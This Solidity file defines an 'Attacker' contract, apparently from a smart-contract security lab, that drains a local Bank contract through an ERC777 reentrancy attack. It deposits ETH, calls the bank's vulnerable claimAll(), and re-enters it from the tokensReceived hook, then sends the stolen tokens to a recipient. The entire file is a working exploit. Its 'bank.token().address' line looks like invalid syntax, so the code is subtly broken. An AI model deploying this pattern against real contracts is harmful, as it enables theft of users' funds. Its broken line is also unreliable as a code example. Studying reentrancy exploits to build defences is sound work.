// Attacker.sol
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
    IERC1820Registry private _erc1820 = IERC1820Registry(
        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
    );
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    uint8 public depth = 0;
    uint8 public constant max_depth = 2;

    Bank public bank;

    event Deposit(uint256 amount);
    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);
        // register this contract as an ERC777 recipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, bank.token().address);
    }

    /*
       Starts the attack.  Caller must send `amt` ETH along with this call.
    */
    function attack(uint256 amt) payable public {
        require(address(bank) != address(0), "Target bank not set");
        require(msg.value == amt,             "Must send ETH = amt");

        // reset recursion counter
        depth = 0;

        // 1) deposit ETH to the bank
        bank.deposit{value: amt}();
        emit Deposit(amt);

        // 2) trigger the vulnerable claimAll → this will mint tokens,
        //    which calls our tokensReceived hook and lets us recurse.
        bank.claimAll();
    }

    /*
       After the attack, pull out all of the stolen ERC777 tokens to `recipient`.
    */
    function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        token.send(recipient, token.balanceOf(address(this)), "");
    }

    /*
       This is called by the ERC777 token during mint().
       We use it to re-enter `bank.claimAll()` as long as depth < max_depth.
    */
    function tokensReceived(
        address,    /* operator */
        address,    /* from */
        address,    /* to */
        uint256,    /* amount */
        bytes calldata, /* userData */
        bytes calldata  /* operatorData */
    ) external override {
        // only react to our target token
        require(msg.sender == address(bank.token()), "Invalid token");

        if (depth < max_depth) {
            depth++;
            emit Recurse(depth);
            // re-enter the vulnerable call
            bank.claimAll();
        }
    }
}


